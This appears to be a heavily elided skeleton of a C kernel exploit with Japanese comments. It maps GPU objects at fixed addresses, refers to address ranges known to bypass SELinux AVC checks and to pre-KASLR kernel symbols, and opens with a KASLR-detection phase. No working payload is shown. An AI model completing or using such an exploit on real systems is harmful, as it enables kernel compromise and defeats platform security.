#define _FILE_OFFSET_BITS 64   /* これで off_t が 64-bit になり、mmap オフセットオーバーフローを防止 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
/* AVC バイパス実績のあるアドレス範囲（32-bit GPU 対応） */
...
// vmlinux symbols (pre-KASLR) – 後で perf で補正
...
/* mmap オフセットを 64-bit で安全に計算（_FILE_OFFSET_BITS=64 により off_t は 64-bit） */
...
static void *gpuobj_mmap_fixed(int fd, size_t size, unsigned int id, void *addr) {
    ...
    if (p == MAP_FAILED) {
        fprintf(stderr, "[!] mmap fixed failed: addr=%p size=0x%lx offset=0x%lx id=%u errno=%d (%s)\n",
...
int main(int argc, char **argv) {
    ...
    // Phase 0: KASLR detection (optional)
